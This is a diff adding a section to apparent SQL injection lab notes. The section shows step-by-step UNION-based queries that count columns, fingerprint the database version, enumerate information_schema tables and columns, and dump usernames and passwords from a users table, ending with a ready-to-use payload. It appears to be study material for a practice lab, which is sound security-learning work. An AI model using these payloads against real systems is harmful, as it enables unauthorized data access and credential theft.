@@ -86,3 +86,17 @@ SELECT * FROM products WHERE category = 'Gifts' UNION SELECT NULL,@@version%23
 
 > Payload : `' UNION SELECT NULL,@@version%23`
 
+## SQL injection attack, listing the database contents on non-Oracle databases
+
+```sql
+SELECT * FROM products WHERE category = 'Gifts'
+SELECT * FROM products WHERE category = 'Gifts' ORDER BY 3--'
+SELECT * FROM products WHERE category = 'Gifts' UNION SELECT 'a','a'--'
+SELECT * FROM products WHERE category = 'Gifts' UNION SELECT NULL,version()--'
+SELECT * FROM products WHERE category = 'Gifts' UNION SELECT NULL, table_name FROM information_schema.tables--'
+SELECT * FROM products WHERE category = 'Gifts' UNION SELECT NULL, column_name FROM information_schema.columns WHERE table_name='users_eusdjy'--'
+
+SELECT * FROM products WHERE category = 'Gifts' UNION SELECT NULL, username_pkzadx||':'||password_ipdxdb FROM users_eusdjy--'
+```
+
+> Payload: `' UNION SELECT NULL, username_pkzadx||':'||password_ipdxdb FROM users_eusdjy--`
